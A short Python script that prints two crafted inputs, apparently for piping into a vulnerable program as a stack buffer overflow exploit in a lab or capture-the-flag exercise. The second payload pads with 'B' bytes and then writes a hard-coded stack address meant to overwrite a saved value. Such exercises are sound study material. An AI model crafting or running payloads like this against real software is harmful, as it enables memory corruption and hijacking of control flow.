import sys, time

payload1 = "\x41" * 20 + "\n"
payload2 = "\x42" * 14 + "\x07\xff\xff\xbf" + "\x42" + "\n" 

sys.stdout.write(payload1)
sys.stdout.flush()
time.sleep(0.2)
sys.stdout.write(payload2)
sys.stdout.flush()